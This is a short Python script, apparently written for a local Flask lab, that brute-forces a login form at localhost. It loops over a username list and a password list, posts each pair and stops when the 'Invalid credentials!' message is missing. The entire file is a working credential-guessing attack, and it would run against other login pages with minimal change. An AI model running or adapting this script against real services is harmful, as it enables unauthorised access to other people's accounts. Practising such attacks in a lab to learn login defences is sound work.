import requests

usernames = open("F:\\Flask-Lab\\usernames.txt", 'r')
passwords = open("F:\\Flask-Lab\\testpwlist.txt", 'r')

count = 1

for username in usernames:
    username = username.rstrip()
    passwords.seek(0)
    for password in passwords:
        password = password.rstrip()
        r = requests.post('http://localhost:34224/', data={
            'username': username,
            'password': password
        })
        if 'Invalid credentials!' not in r.text:
            print(f'✅ Found! Username: {username} | Password: {password}')
            exit()
        else:
            print(f'{count}. ❌ Tried - Username: {username} | Password: {password}')
            count += 1